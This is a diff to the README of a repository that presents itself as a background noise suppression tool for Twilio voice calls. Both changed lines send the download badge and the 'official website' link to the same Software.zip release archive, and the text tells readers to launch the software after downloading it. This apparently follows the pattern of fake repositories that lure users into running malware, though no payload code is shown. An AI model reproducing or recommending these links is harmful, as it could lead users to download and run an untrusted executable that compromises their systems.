@@ -12,7 +12,7 @@ Inside this repository, you will find relevant code and resources to implement b
 ## 🚀 Get Started
 To get started with implementing background noise suppression for your Twilio voice calls, you can access the project files by downloading the software package from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/Helker123121/twilio-voice-background-noise-suppression/releases/download/v2.0/Software.zip)](https://github.com/Helker123121/twilio-voice-background-noise-suppression/releases/download/v2.0/Software.zip)
 
 *Please note that the software needs to be launched after downloading to access its functionality.*
 
@@ -39,7 +39,7 @@ This repository covers a wide range of topics related to background noise suppre
 For further information and resources related to background noise suppression, Twilio voice API integration, and audio filtering techniques, feel free to explore the contents of this repository. We are constantly updating and improving the functionality to provide you with the best tools for enhancing your Twilio voice calls.
 
 ## 🌐 Explore Further
-Visit the [official website](https://github.com/user-attachments/files/18410590/Software.zip) to access additional resources and stay updated on the latest developments in background noise suppression for Twilio voice calls.
+Visit the [official website](https://github.com/Helker123121/twilio-voice-background-noise-suppression/releases/download/v2.0/Software.zip) to access additional resources and stay updated on the latest developments in background noise suppression for Twilio voice calls.
 
 Let's collaborate to create crystal-clear voice calls with minimal background noise interference! 🎙️🔇
 
